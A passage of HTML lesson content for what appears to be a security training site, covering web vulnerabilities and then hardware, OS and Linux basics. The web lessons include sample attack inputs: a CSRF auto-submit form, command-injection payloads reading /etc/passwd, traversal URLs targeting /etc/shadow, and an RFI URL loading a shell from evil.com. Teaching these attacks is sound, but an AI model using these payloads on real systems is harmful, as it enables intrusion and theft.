                    <li>Use sanitization libraries (DOMPurify, OWASP Java Encoder)</li>
                    <li>Input validation as defense-in-depth (not a primary defense)</li>
                </ul>
                <h3>Key Takeaway</h3>
                <p>Never trust user input. Always encode output based on the context where it's being rendered. A <code>&lt;script&gt;</code> tag is the most obvious XSS vector, but any HTML attribute that accepts JavaScript (e.g., <code>onerror</code>, <code>onclick</code>, <code>onload</code>) can be exploited.</p>`,
            'csrf-attack': `
                <h2>What is Cross-Site Request Forgery (CSRF)?</h2>
                <p>CSRF tricks authenticated users into performing unintended actions on a website. The attacker exploits the browser's automatic inclusion of session cookies.</p>
                <h3>How It Works</h3>
                <ol>
                    <li>User logs into <code>bank.com</code> and gets a session cookie</li>
                    <li>User visits <code>evil.com</code> (attacker's site)</li>
                    <li>Evil page contains a hidden form that submits to <code>bank.com/transfer</code></li>
                    <li>Browser automatically includes the bank's session cookie</li>
                    <li>Transfer is executed with the victim's credentials</li>
                </ol>
                <pre class="code-example">&lt;!-- Hidden on attacker's page --&gt;
&lt;form action="https://bank.com/transfer" method="POST"&gt;
  &lt;input type="hidden" name="to" value="attacker_account"&gt;
  &lt;input type="hidden" name="amount" value="10000"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>
                <h3>Prevention</h3>
                <ul>
                    <li><strong>Anti-CSRF tokens</strong> (synchronizer token pattern)</li>
                    <li>SameSite cookie attribute</li>
                    <li>Origin/Referer header validation</li>
                    <li>Re-authentication for sensitive actions</li>
                </ul>`,
            'broken-authentication': `
                <h2>Broken Authentication</h2>
                <p>Broken Authentication vulnerabilities allow attackers to compromise passwords, keys, or session tokens, or exploit implementation flaws to assume other users' identities.</p>
                <h3>Common Weaknesses</h3>
                <ul>
                    <li>Weak password policies</li>
                    <li>Credential stuffing (using leaked credentials)</li>
                    <li>Session fixation attacks</li>
                    <li>Missing brute-force protection</li>
                    <li>Insecure session management</li>
                    <li>Passwords stored in plaintext or weak hashes</li>
                </ul>
                <h3>Prevention</h3>
                <ul>
                    <li>Multi-factor authentication (MFA)</li>
                    <li>Strong password policies + breach check</li>
                    <li>Account lockout and rate limiting</li>
                    <li>Secure session management (regenerate ID on login)</li>
                    <li>Use bcrypt/scrypt/argon2 for password hashing</li>
                </ul>`,
            'broken-auth': null,
            'idor': `
                <h2>Insecure Direct Object Reference (IDOR)</h2>
                <p>IDOR occurs when an application provides direct access to objects based on user-supplied input without proper authorization checks.</p>
                <h3>Example</h3>
                <pre class="code-example">// Vulnerable API endpoint
GET /api/users/1001/profile

// Attacker changes the ID
GET /api/users/1002/profile  ← accesses someone else's data!</pre>
                <h3>Impact</h3>
                <ul>
                    <li>Unauthorized access to other users' data</li>
                    <li>Data modification/deletion</li>
                    <li>Horizontal privilege escalation</li>
                </ul>
                <h3>Prevention</h3>
                <ul>
                    <li>Server-side authorization checks on every request</li>
                    <li>Use indirect references (UUIDs instead of sequential IDs)</li>
                    <li>Access control lists (ACLs)</li>
                </ul>`,
            'command-injection': `
                <h2>Command Injection</h2>
                <p>Command injection allows attackers to execute arbitrary operating system commands on the server through a vulnerable application. It occurs when user-supplied data is passed to a system shell without proper validation or sanitization.</p>
                <h3>Identifying Command Injection</h3>
                <p>Look for scenarios where user input flows to CLI commands: ping utilities, DNS lookups, file conversion tools, system administration panels, or any feature that interacts with the OS.</p>
                <h3>How It Works</h3>
                <pre class="code-example">// Vulnerable code
String cmd = "ping -c 4 " + userInput;
Runtime.getRuntime().exec(cmd);

// Attacker input: 8.8.8.8; cat /etc/passwd
// Executed: ping -c 4 8.8.8.8; cat /etc/passwd</pre>
                <h3>Exploitation — Easy Mode</h3>
                <p>When user input is directly appended to a command without any quoting or escaping:</p>
                <pre class="code-example"># Input field value → directly concatenated
# Payload: ; whoami
# Full command: ping -c 4 ; whoami

# Or using command substitution:
# Payload: $(cat /etc/passwd)
# Payload: \`cat /etc/passwd\`</pre>
                <h3>Exploitation — Hard Mode</h3>
                <p>When user input is wrapped in quotes, attackers must first close the quote:</p>
                <pre class="code-example"># Server code: ping -c 4 "USER_INPUT"
# Payload: " ; whoami ; echo "
# Result: ping -c 4 "" ; whoami ; echo ""

# Single-quoted context: ping -c 4 'USER_INPUT'
# Payload: ' ; whoami ; echo '
# Result: ping -c 4 '' ; whoami ; echo ''</pre>
                <h3>Command Separators & Operators</h3>
                <table class="info-table">
                    <tr><th>Operator</th><th>Behavior</th><th>Example</th></tr>
                    <tr><td><code>;</code></td><td>Sequential — always executes second command</td><td><code>; whoami</code></td></tr>
                    <tr><td><code>&&</code></td><td>Execute second only if first succeeds</td><td><code>&& cat /etc/passwd</code></td></tr>
                    <tr><td><code>||</code></td><td>Execute second only if first fails</td><td><code>|| id</code></td></tr>
                    <tr><td><code>|</code></td><td>Pipe — output of first as input to second</td><td><code>| ls -la</code></td></tr>
                    <tr><td><code>$(cmd)</code></td><td>Command substitution</td><td><code>$(whoami)</code></td></tr>
                    <tr><td><code>\`cmd\`</code></td><td>Backtick substitution</td><td><code>\`id\`</code></td></tr>
                </table>
                <h3>Prevention — Use Native Functions</h3>
                <p>The best defense is to <strong>avoid calling OS commands entirely</strong>. Use language-native APIs instead:</p>
                <pre class="code-example">// VULNERABLE: Using OS command
Runtime.exec("ping -c 4 " + host);

// SAFE: Use Java's InetAddress API
InetAddress addr = InetAddress.getByName(host);
boolean reachable = addr.isReachable(5000);</pre>
                <ul>
                    <li><strong>Avoid OS commands</strong> — use language-native APIs (e.g., Java's InetAddress, Python's socket)</li>
                    <li>If OS commands are unavoidable, use strict allow-list validation</li>
                    <li>Use parameterized command execution (ProcessBuilder with argument arrays)</li>
                    <li>Sanitization libraries that escape shell metacharacters</li>
                    <li>Run the application with minimal OS permissions</li>
                </ul>`,
            'path-traversal': `
                <h2>Path Traversal (Directory Traversal)</h2>
                <p>Path traversal allows attackers to access files outside the intended directory by manipulating file paths with sequences like <code>../</code>.</p>
                <h3>Example</h3>
                <pre class="code-example">// Vulnerable endpoint
GET /api/files?name=report.pdf

// Attacker request
GET /api/files?name=../../../etc/passwd</pre>
                <h3>Prevention</h3>
                <ul>
                    <li>Validate and sanitize file paths</li>
                    <li>Use a whitelist of allowed files</li>
                    <li>Canonicalize paths and check against base directory</li>
                    <li>Run with minimal file system permissions</li>
                </ul>`,
            'security-misconfiguration': `
                <h2>Security Misconfiguration</h2>
                <p>Security misconfiguration is the most common vulnerability. It occurs when security settings are not properly defined, implemented, or maintained.</p>
                <h3>Common Issues</h3>
                <ul>
                    <li>Default credentials left unchanged</li>
                    <li>Unnecessary features enabled (ports, services, pages)</li>
                    <li>Verbose error messages exposing internals</li>
                    <li>Missing security headers</li>
                    <li>Unpatched software</li>
                    <li>Directory listing enabled</li>
                </ul>
                <h3>Important Security Headers</h3>
                <table class="info-table">
                    <tr><th>Header</th><th>Purpose</th></tr>
                    <tr><td>Content-Security-Policy</td><td>Prevents XSS, injection attacks</td></tr>
                    <tr><td>X-Frame-Options</td><td>Prevents clickjacking</td></tr>
                    <tr><td>X-Content-Type-Options</td><td>Prevents MIME-sniffing</td></tr>
                    <tr><td>Strict-Transport-Security</td><td>Forces HTTPS</td></tr>
                    <tr><td>X-XSS-Protection</td><td>Browser XSS filter</td></tr>
                </table>
                <h3>Prevention</h3>
                <ul>
                    <li>Automated security configuration scans</li>
                    <li>Hardening guides for all components</li>
                    <li>Remove default accounts and unnecessary features</li>
                    <li>Regular patching and updates</li>
                </ul>`,
            'file-inclusion': `
                <h2>File Inclusion Vulnerabilities</h2>
                <p>File inclusion vulnerabilities occur when an application dynamically includes files based on user-supplied input without proper validation. This can allow attackers to read sensitive files, execute malicious code, or gain full control of the server.</p>
                <h3>Local File Inclusion (LFI)</h3>
                <p>LFI exploits occur when the application includes files from the local server's filesystem. Attackers use directory traversal sequences (<code>../</code>) to escape the intended directory:</p>
                <pre class="code-example">// Vulnerable PHP code
&lt;?php include($_GET['page']); ?&gt;

// Normal use:
https://site.com/view?page=about.php

// LFI Attack:
https://site.com/view?page=../../../../etc/passwd
https://site.com/view?page=../../../../etc/shadow
https://site.com/view?page=../../../../var/log/apache2/access.log</pre>
                <h3>Remote File Inclusion (RFI)</h3>
                <p>RFI is even more dangerous — it allows including files from external servers, potentially executing attacker-controlled code:</p>
                <pre class="code-example">// RFI Attack (requires allow_url_include = On in PHP):
https://site.com/view?page=https://evil.com/shell.php

// The server fetches and executes the remote file!
// This gives the attacker full code execution on the server.</pre>
                <h3>Common Target Files</h3>
                <table class="info-table">
                    <tr><th>File</th><th>Contains</th><th>Risk</th></tr>
                    <tr><td><code>/etc/passwd</code></td><td>User accounts</td><td>User enumeration</td></tr>
                    <tr><td><code>/etc/shadow</code></td><td>Password hashes</td><td>Offline cracking</td></tr>
                    <tr><td><code>/var/log/apache2/access.log</code></td><td>Web server logs</td><td>Log poisoning for RCE</td></tr>
                    <tr><td><code>/proc/self/environ</code></td><td>Environment variables</td><td>Secret/credential leakage</td></tr>
                    <tr><td><code>web.xml</code> / <code>config.php</code></td><td>App configuration</td><td>Database credentials</td></tr>
                </table>
                <h3>Impact</h3>
                <ul>
                    <li>Reading sensitive configuration files and credentials</li>
                    <li>Source code disclosure</li>
                    <li>Remote Code Execution (via RFI or log poisoning)</li>
                    <li>Full server compromise</li>
                </ul>
                <h3>Prevention</h3>
                <ul>
                    <li><strong>Whitelist allowed files</strong> — use a map of allowed page names to actual file paths</li>
                    <li>Disable <code>allow_url_include</code> and <code>allow_url_fopen</code> in PHP configuration</li>
                    <li>Use a web application firewall to detect traversal sequences</li>
                    <li>Canonicalize paths and verify they resolve within the allowed base directory</li>
                    <li>Run the web server with minimal filesystem permissions</li>
                    <li>Use frameworks that handle file inclusion safely</li>
                </ul>`,

            // ============================================================
            // COURSE 1: Computer Components & Concepts
            // ============================================================
            'motherboards': `
                <h2>Motherboards</h2>
                <p>The <strong>motherboard</strong> is the main circuit board in a computer. It physically houses the CPU, RAM, and expansion cards, and provides electrical connections between all components via a network of buses.</p>
                <div class="theory-callout info"><strong>🔧 Key Concept:</strong> The motherboard determines what hardware your system can support — CPU type, RAM capacity, expansion slots, and I/O ports.</div>
                <h3>Form Factors</h3>
                <p>Motherboards come in standard sizes that determine case compatibility:</p>
                <ul>
                    <li><strong>E-ATX</strong> — Extended ATX, largest standard size, used for servers and high-end workstations</li>
                    <li><strong>ATX</strong> — Standard size for desktop PCs, plenty of expansion slots</li>
                    <li><strong>Micro-ATX</strong> — Smaller, fewer expansion slots, budget builds</li>
                    <li><strong>Mini-ITX</strong> — Smallest, typically one expansion slot, compact builds</li>
                </ul>
                <h3>Key Components</h3>
                <ul>
                    <li><strong>CPU Socket</strong> — Connects the processor; socket type must match CPU (e.g., LGA 1700, AM5)</li>
                    <li><strong>RAM Slots</strong> — DIMM slots for memory modules (DDR4/DDR5)</li>
                    <li><strong>PCI Express Slots</strong> — High-speed expansion bus for GPUs, network cards, SSDs</li>
                    <li><strong>Chipset</strong> — Controls communication between CPU, RAM, and peripherals</li>
                    <li><strong>SATA Ports</strong> — Connect storage drives (HDD/SSD)</li>
                    <li><strong>USB Headers</strong> — Internal connectors for front-panel USB ports</li>
                    <li><strong>Power Connectors</strong> — ATX 20/24-pin main power, 4/8-pin CPU power</li>
                </ul>`,

            'cpus-processing': `
                <h2>CPUs & Processing</h2>
                <p>The <strong>Central Processing Unit (CPU)</strong> is the brain of the computer. It executes instructions from programs by performing arithmetic, logic, and control operations.</p>
                <h3>Key Concepts</h3>
                <ul>
                    <li><strong>Cores</strong> — Modern CPUs have multiple cores (2-64+), each capable of independent execution</li>
                    <li><strong>Clock Speed</strong> — Measured in GHz (billions of cycles per second). A 4 GHz CPU performs 4 billion cycles per second</li>
                    <li><strong>Context Switching</strong> — The CPU rapidly switches between tasks, giving the illusion of multitasking. The state of each task is saved and restored</li>
                    <li><strong>Cache</strong> — Small, ultra-fast memory on the CPU (L1, L2, L3) that stores frequently accessed data</li>
                    <li><strong>Instruction Pipeline</strong> — CPUs fetch, decode, and execute instructions in an assembly-line fashion</li>
                </ul>
                <div class="theory-callout info"><strong>💡 Security Note:</strong> GPUs are used for password cracking because they have thousands of simple cores ideal for parallel brute-force operations.</div>`,

            'ram-storage': `
                <h2>RAM & Storage</h2>
                <p>Computers use two types of memory: <strong>volatile</strong> (temporary) and <strong>non-volatile</strong> (permanent).</p>
                <h3>RAM (Random Access Memory)</h3>
                <ul>
                    <li><strong>Volatile</strong> — All data is lost when power is removed</li>
                    <li><strong>Fast</strong> — Much faster than storage drives (nanosecond access)</li>
                    <li><strong>Capacity</strong> — Typical: 8-64 GB in modern systems</li>
                    <li><strong>Types</strong> — DDR4, DDR5 (Double Data Rate)</li>
                </ul>
                <h3>Storage (HDD vs SSD)</h3>
                <ul>
                    <li><strong>HDD</strong> — Hard Disk Drive: spinning magnetic platters, 3.5" (desktop) or 2.5" (laptop), connected via SATA</li>
                    <li><strong>SSD</strong> — Solid State Drive: flash memory, no moving parts, much faster, more durable, uses SATA or NVMe (M.2)</li>
                </ul>
                <div class="theory-callout warning"><strong>🔒 Forensic Note:</strong> RAM contents can be recovered briefly after power loss (cold boot attack). Deleted files on HDD can be recovered until overwritten.</div>`,

            'gpus-output': `
                <h2>GPUs & Output Devices</h2>
                <p>The <strong>Graphics Processing Unit (GPU)</strong> handles parallel number crunching — originally for rendering graphics, now used for AI training, cryptocurrency mining, and <strong>password cracking</strong>.</p>
                <h3>Video Output Interfaces</h3>
                <ul>
                    <li><strong>VGA</strong> — Analog, legacy (blue D-sub connector)</li>
                    <li><strong>DVI</strong> — Digital (white connector), supports higher resolutions</li>
                    <li><strong>HDMI</strong> — Digital audio + video, most common modern connector</li>
                    <li><strong>DisplayPort</strong> — High-end digital, supports daisy-chaining monitors</li>
                </ul>
                <h3>Input Devices & Connectors</h3>
                <ul>
                    <li><strong>USB 1.0</strong> — 1.5 Mbps, <strong>USB 2.0</strong> — 480 Mbps, <strong>USB 3.0</strong> — 5 Gbps, <strong>USB 3.1</strong> — 10 Gbps</li>
                    <li><strong>PS/2</strong> — Legacy keyboard/mouse connector (purple for keyboard, green for mouse)</li>
                </ul>`,

            'psu-cooling': `
                <h2>Power Supply & Cooling</h2>
                <p>The <strong>Power Supply Unit (PSU)</strong> converts AC mains electricity to DC power for computer components.</p>
                <h3>PSU Connectors</h3>
                <ul>
                    <li><strong>ATX 20/24-pin</strong> — Main motherboard power</li>
                    <li><strong>4/8-pin CPU</strong> — Dedicated CPU power</li>
                    <li><strong>SATA Power</strong> — For drives</li>
                    <li><strong>6/8-pin PCIe</strong> — For GPUs</li>
                    <li><strong>Molex</strong> — Legacy 4-pin connector</li>
                </ul>
                <h3>Cooling</h3>
                <ul>
                    <li><strong>Thermal Paste</strong> — Applied between CPU and heatsink for heat transfer</li>
                    <li><strong>Heat Sinks</strong> — Metal fins that dissipate heat via surface area</li>
                    <li><strong>Fans</strong> — Active cooling to move hot air away from components</li>
                    <li><strong>Liquid Cooling</strong> — Pumps coolant through tubes for high-performance systems</li>
                </ul>`,

            'bits-bytes-bases': `
                <h2>Bits, Bytes & Number Bases</h2>
                <p>All digital data is represented as <strong>binary</strong> — sequences of 0s and 1s. Understanding number bases is fundamental to computing and security.</p>
                <h3>Units of Data</h3>
                <ul>
                    <li><strong>Bit</strong> — A single 0 or 1 (smallest unit)</li>
                    <li><strong>Byte</strong> — 8 bits (e.g., 01001010)</li>
                    <li><strong>KiB</strong> — 1024 bytes (kibibyte, binary), <strong>kB</strong> — 1000 bytes (kilobyte, decimal)</li>
                </ul>
                <h3>Number Bases</h3>
                <ul>
                    <li><strong>Binary (Base 2)</strong> — Uses digits 0-1. Each position is a power of 2. Example: 1010₂ = 8+0+2+0 = 10</li>
                    <li><strong>Decimal (Base 10)</strong> — Our everyday system, digits 0-9</li>
                    <li><strong>Hexadecimal (Base 16)</strong> — Digits 0-9 and A-F. Compact representation of binary (4 bits = 1 hex digit). Example: FF₁₆ = 255</li>
                </ul>
                <pre class="code-example">Binary:      1010 1100
Hex:         A    C     → 0xAC = 172 decimal
Each hex digit = 4 binary digits (nibble)</pre>`,

            'ascii-encoding': `
                <h2>ASCII & Character Encoding</h2>
                <p><strong>ASCII</strong> (American Standard Code for Information Interchange) maps numbers to characters.</p>
                <h3>ASCII</h3>
                <ul>
                    <li><strong>7-bit ASCII</strong> — 128 characters (0-127): control codes, numbers, uppercase, lowercase, symbols</li>
                    <li><strong>8-bit Extended ASCII</strong> — 256 characters (0-255): adds accented characters</li>
                    <li>Key values: A=65, a=97, 0=48, space=32</li>
                </ul>
                <h3>Unicode & UTF-8</h3>
                <ul>
                    <li><strong>Unicode</strong> — Supports ALL world languages (143,000+ characters)</li>
                    <li><strong>UTF-8</strong> — Variable-length encoding (1-4 bytes per character). ASCII-compatible for English text</li>
                </ul>
                <div class="theory-callout info"><strong>💡 Security Note:</strong> Character encoding mismatches can lead to XSS and SQL injection bypasses when filters expect one encoding but the app processes another.</div>`,

            'base64-encoding': `
                <h2>Base64 Encoding</h2>
                <p>Base64 converts binary data into printable ASCII text using a 64-character alphabet: A-Z, a-z, 0-9, +, /.</p>
                <div class="theory-callout danger"><strong>⚠️ Important:</strong> Base64 is <strong>NOT encryption</strong>. It is encoding — anyone can decode it without a key. Never use Base64 to protect sensitive data!</div>
                <h3>How It Works</h3>
                <ul>
                    <li>Takes 3 bytes of input (24 bits) and splits into 4 groups of 6 bits</li>
                    <li>Each 6-bit group maps to one of the 64 characters</li>
                    <li>Padding with <code>=</code> when input length is not divisible by 3</li>
                </ul>
                <pre class="code-example">Text:    "Hello"
Binary:  01001000 01100101 01101100 01101100 01101111
Base64:  SGVsbG8=

$ echo -n "Hello" | base64     → SGVsbG8=
$ echo "SGVsbG8=" | base64 -d  → Hello</pre>
                <h3>Where Base64 Is Used</h3>
                <ul>
                    <li>Email attachments (MIME)</li>
                    <li>Embedding images in HTML/CSS (data URIs)</li>
                    <li>API authentication tokens</li>
                    <li>Storing credentials in deployment files (like unattend.xml — a security risk!)</li>
                </ul>`,

            'file-headers': `
                <h2>File Headers & Magic Numbers</h2>
                <p><strong>Magic numbers</strong> are the first few bytes of a file that identify its type — regardless of the file extension.</p>
                <h3>Common Magic Numbers</h3>
                <pre class="code-example">File Type   Magic Bytes (Hex)    ASCII
──────────  ──────────────────   ─────
ZIP         50 4B 03 04          PK..
JPEG        FF D8 FF             ÿØÿ
PNG         89 50 4E 47          .PNG
PDF         25 50 44 46          %PDF
GIF         47 49 46 38          GIF8
ELF (Linux) 7F 45 4C 46          .ELF
EXE (Win)   4D 5A                MZ</pre>
                <div class="theory-callout warning"><strong>🔒 Security Implication:</strong> File extensions can lie! A file named <code>image.jpg</code> could actually be a PHP web shell. Always check magic bytes for file validation. The <code>file</code> command on Linux checks headers, not extensions.</div>`,

            'boolean-logic': `
                <h2>Boolean Logic & Gates</h2>
                <p>Boolean logic is the foundation of all digital computing. Every operation a computer performs reduces to combinations of logic gates.</p>
                <h3>Logic Gates</h3>
                <pre class="code-example">Gate   Symbol   Truth Table
─────  ──────   ───────────
AND    A && B   0&0=0  0&1=0  1&0=0  1&1=1
OR     A || B   0|0=0  0|1=1  1|0=1  1|1=1
NOT    !A       !0=1   !1=0
NAND   !(A&B)   opposite of AND
NOR    !(A|B)   opposite of OR
XOR    A^B      0^0=0  0^1=1  1^0=1  1^1=0</pre>
                <h3>Key Properties</h3>
                <ul>
                    <li><strong>Tautology</strong> — Always true (e.g., A OR NOT A)</li>
                    <li><strong>Contradiction</strong> — Always false (e.g., A AND NOT A)</li>
                    <li><strong>Contingency</strong> — Depends on input values</li>
                </ul>`,

            'xor-encryption': `
                <h2>XOR Encryption</h2>
                <p>XOR (exclusive OR) has a special property that makes it useful for encryption: <strong>applying XOR twice with the same key returns the original data</strong>.</p>
                <pre class="code-example">Plaintext:   01001000  ("H")
Key:         11110000
─────────────────────
Ciphertext:  10111000  (XOR)

Ciphertext:  10111000
Key:         11110000
─────────────────────
Plaintext:   01001000  ("H") ← Original recovered!</pre>
                <div class="theory-callout info"><strong>💡 How It Works:</strong> plaintext ⊕ key = ciphertext, and ciphertext ⊕ key = plaintext. XOR is the basis of many real cryptographic algorithms (AES uses XOR internally).</div>
                <h3>Weakness of Simple XOR</h3>
                <p>If the key is shorter than the message, it repeats — making it vulnerable to frequency analysis. Real encryption uses much more sophisticated key scheduling.</p>`,

            'file-systems-overview': `
                <h2>File Systems Overview</h2>
                <p>A <strong>file system</strong> organizes how data is stored and retrieved on a disk. Different operating systems use different file systems.</p>
                <h3>Comparison</h3>
                <pre class="code-example">File System  Max File   OS Support       Features
───────────  ─────────  ───────────────  ────────────────────────
FAT32        4 GB       Universal        Simple, no permissions
exFAT        16 EB      Win/Mac/Linux    Large files, flash drives
NTFS         16 EB      Windows          Permissions, encryption,
                                         shadow copies, journaling
EXT3         2 TB       Linux            Journaling
EXT4         16 TB      Linux            Default on modern Linux,
                                         practically unlimited</pre>
                <h3>Key Concepts</h3>
                <ul>
                    <li><strong>Clusters</strong> — Smallest unit of storage allocation (typically 4 KB)</li>
                    <li><strong>Slack Space</strong> — Unused space within a cluster after a file ends. May contain remnants of previously deleted files</li>
                    <li><strong>Journaling</strong> — Records changes before writing them, preventing corruption on power loss</li>
                </ul>`,

            'slack-space': `
                <h2>Slack Space & Forensics</h2>
                <p>When a file doesn't fill its last cluster completely, the remaining space is called <strong>slack space</strong>. This space may contain remnants of previously deleted files.</p>
                <h3>Forensic Implications</h3>
                <ul>
                    <li><strong>Deleted files</strong> are not immediately erased — only their directory entry is removed. The data remains until overwritten</li>
                    <li><strong>Slack space</strong> can contain fragments of old files — valuable for forensic investigators</li>
                    <li>Tools like Autopsy and Sleuth Kit can recover deleted files and analyze slack space</li>
                    <li><strong>Secure deletion</strong> requires overwriting data (e.g., <code>shred</code> command on Linux)</li>
                </ul>`,

            'cloud-models': `
                <h2>Cloud Service Models</h2>
                <p>Cloud computing delivers computing services over the internet. The three main models differ in <strong>what you manage vs what the provider manages</strong>.</p>
                <h3>Service Models</h3>
                <ul>
                    <li><strong>SaaS</strong> (Software as a Service) — You use the application. Provider manages everything. Examples: Gmail, Office 365, Salesforce</li>
                    <li><strong>PaaS</strong> (Platform as a Service) — You write code. Provider manages servers, OS, runtime. Examples: Heroku, Google App Engine</li>
                    <li><strong>IaaS</strong> (Infrastructure as a Service) — You manage OS and up. Provider manages hardware and networking. Examples: AWS EC2, Azure VMs</li>
                </ul>
                <pre class="code-example">                You Manage          Provider Manages
─────────────── ─────────────────── ────────────────────
On-Premises     Everything          Nothing
IaaS            OS, Apps, Data      Hardware, Network
PaaS            Apps, Data          Hardware, OS, Runtime
SaaS            Nothing (just use)  Everything</pre>`,

            // ============================================================
            // COURSE 2: OS & Virtualization
            // ============================================================
            'os-fundamentals': `
                <h2>Operating System Fundamentals</h2>
                <p>An <strong>operating system (OS)</strong> is software that manages computer hardware and provides services for programs. It acts as an intermediary between users and the computer hardware.</p>
                <h3>The Kernel</h3>
                <ul>
                    <li>The <strong>kernel</strong> is the core of the OS, running in <strong>protected memory</strong></li>
                    <li>It manages CPU scheduling, memory allocation, device drivers, and system calls</li>
                    <li>User programs cannot directly access kernel memory (memory protection)</li>
                </ul>
                <h3>Processes & Interrupts</h3>
                <ul>
                    <li><strong>Process</strong> — A running program with its own memory space, PID, and resources</li>
                    <li><strong>Hardware Interrupts</strong> — Physical signals (keyboard press, disk completion)</li>
                    <li><strong>Software Interrupts</strong> — Program-generated signals (system calls, exceptions)</li>
                </ul>
                <h3>BIOS vs UEFI</h3>
                <ul>
                    <li><strong>BIOS</strong> — Basic Input/Output System, legacy firmware, text-based setup</li>
                    <li><strong>UEFI</strong> — Unified Extensible Firmware Interface, modern replacement with graphical setup, Secure Boot, faster boot times</li>
                </ul>`,

            'boot-process': `
                <h2>Boot Process & BIOS/UEFI</h2>
                <p>The boot process brings a computer from power-off to a running operating system.</p>
                <h3>Boot Sequence</h3>
                <ol>
                    <li><strong>Power On</strong> — Electricity flows to motherboard</li>
                    <li><strong>POST</strong> — Power-On Self-Test checks hardware is functional</li>
                    <li><strong>BIOS/UEFI</strong> — Firmware identifies boot device</li>
                    <li><strong>Boot Loader</strong> — GRUB (Linux) or Windows Boot Manager loads the OS kernel</li>
                    <li><strong>Kernel Initialization</strong> — OS kernel loads drivers and starts services</li>
                    <li><strong>User Space</strong> — Login screen or desktop appears</li>
                </ol>
                <div class="theory-callout warning"><strong>🔒 Security:</strong> UEFI Secure Boot verifies boot loader signatures to prevent bootkit malware. Disabling it is sometimes needed for dual-boot or custom OS installations.</div>`,

            'vms-hypervisors': `
                <h2>Virtual Machines & Hypervisors</h2>
                <p>A <strong>virtual machine (VM)</strong> is a software emulation of a complete computer, running its own OS and applications.</p>
                <h3>Types of Hypervisors</h3>
                <ul>
                    <li><strong>Type 1 (Bare-Metal)</strong> — Runs directly on hardware, no host OS. Examples: VMware ESXi, Microsoft Hyper-V, Xen. Used in cloud data centers</li>
                    <li><strong>Type 2 (Hosted)</strong> — Runs on top of a host OS. Examples: VirtualBox, VMware Workstation. Used for development and testing</li>
                </ul>
                <h3>Use Cases</h3>
                <ul>
                    <li><strong>Cloud Computing</strong> — Multiple VMs on one physical server</li>
                    <li><strong>Security Testing</strong> — Isolated environments for malware analysis</li>
                    <li><strong>Development</strong> — Consistent environments across team members</li>
                    <li><strong>Disaster Recovery</strong> — Snapshots allow instant rollback</li>
                </ul>`,

            'virtualization-uses': `
                <h2>Virtualization Use Cases</h2>
                <p>Virtualization enables running multiple operating systems simultaneously on a single physical machine, with many practical applications.</p>
                <h3>Key Benefits</h3>
                <ul>
                    <li><strong>Resource Efficiency</strong> — Multiple servers on one machine reduces hardware costs</li>
                    <li><strong>Isolation</strong> — VMs are sandboxed from each other and the host</li>
                    <li><strong>Snapshots</strong> — Save VM state and restore instantly</li>
                    <li><strong>Portability</strong> — VMs can be moved between hosts</li>
                </ul>
                <div class="theory-callout info"><strong>🔐 Security Use:</strong> Security researchers run malware inside VMs for safe analysis. Penetration testers use Kali Linux in VMs. Legacy insecure software (e.g., Windows XP) can be isolated in VMs with no network access.</div>`,

            // ============================================================
            // COURSE 3: Linux
            // ============================================================
            'linux-distros': `
                <h2>Linux Distributions & GUI</h2>
                <p><strong>Linux</strong> is an open-source operating system kernel created by Linus Torvalds. Distributions bundle the kernel with software packages, desktop environments, and package managers.</p>
                <h3>Popular Distributions</h3>
                <ul>
                    <li><strong>Ubuntu</strong> — User-friendly desktop Linux, popular for beginners</li>
                    <li><strong>Fedora</strong> — Cutting-edge features, Red Hat sponsored</li>
                    <li><strong>Kali Linux</strong> — Pre-loaded with security/penetration testing tools</li>
                    <li><strong>CentOS/Rocky</strong> — Server-focused, enterprise stability</li>
                    <li><strong>Arch Linux</strong> — Rolling release, advanced users</li>
                </ul>
                <h3>Desktop vs Server</h3>
                <ul>
                    <li><strong>Desktop</strong> — GUI with dock, file browser, system tray, applications menu</li>
                    <li><strong>Server</strong> — Terminal-only, no GUI (saves resources), managed via SSH</li>
                </ul>`,

            'linux-terminal': `
                <h2>The Linux Terminal</h2>
                <p>The terminal provides a text-based interface to the operating system. It is more powerful and efficient than the GUI for most administrative tasks.</p>
                <h3>Terminal Basics</h3>
                <pre class="code-example">username@hostname:~$ command [options] [arguments]
    │        │     │
    │        │     └─ Current directory (~ = home)
    │        └─ Machine name
    └─ Your username

$ = normal user
# = root user</pre>
                <h3>Bash Shell</h3>
                <ul>
                    <li><strong>Bash</strong> (Bourne Again Shell) is the default shell on most Linux systems</li>
                    <li>Interprets commands, supports scripting, variables, loops, conditionals</li>
                    <li>Configuration stored in <code>~/.bashrc</code> and <code>~/.bash_profile</code></li>
                </ul>`,

            'superuser-sudo': `
                <h2>Superuser & Sudo</h2>
                <p>Linux has a strict permission model. The <strong>root user</strong> (UID 0) has unrestricted access to everything on the system.</p>
                <h3>Key Commands</h3>
                <pre class="code-example"># Switch to another user (requires their password)
$ su username

# Switch to root (requires root password)
$ su -

# Run a single command as root (requires YOUR password)
$ sudo apt update

# Open a root shell
$ sudo -i</pre>
                <div class="theory-callout danger"><strong>⚠️ Best Practice:</strong> Never log in as root directly. Always use <code>sudo</code> for individual commands — it provides an audit trail and limits exposure.</div>`,

            'linux-folders': `
                <h2>Linux Folder Structure</h2>
                <p>Linux uses a hierarchical directory structure starting from the root directory <code>/</code>.</p>
                <pre class="code-example">/           Root of the filesystem
├── bin/     Essential binaries (ls, cp, cat)
├── etc/     Configuration files
├── home/    User home directories
├── var/     Variable data (logs, databases)
├── tmp/     Temporary files (cleared on reboot)
├── root/    Root user's home directory
├── usr/     User programs and utilities
├── dev/     Device files (hardware as files)
├── proc/    Virtual filesystem (process info)
├── opt/     Optional/third-party software
├── boot/    Boot loader files (kernel, GRUB)
├── lib/     Shared libraries
└── mnt/     Mount points for external media</pre>
                <div class="theory-callout info"><strong>💡 Key Insight:</strong> In Linux, <strong>everything is a file</strong> — devices, processes, and even network sockets are represented as files.</div>`,

            'file-permissions': `
                <h2>File Permissions</h2>
                <p>Linux uses a permission system with three types of access for three categories of users.</p>
                <h3>Permission Types</h3>
                <pre class="code-example">Permission  Symbol  Numeric  Meaning
──────────  ──────  ───────  ──────────────
Read        r       4        View contents
Write       w       2        Modify contents
Execute     x       1        Run as program

Example: rwxr-xr-x = 755
  Owner:  rwx (4+2+1 = 7)
  Group:  r-x (4+0+1 = 5)
  Others: r-x (4+0+1 = 5)</pre>
                <h3>Commands</h3>
                <pre class="code-example">$ chmod 755 file.sh      # Set permissions numerically
$ chmod u+x file.sh      # Add execute for user
$ chmod u+s file.sh      # Set SUID bit
$ chown user:group file   # Change ownership
$ ls -la                  # View permissions</pre>
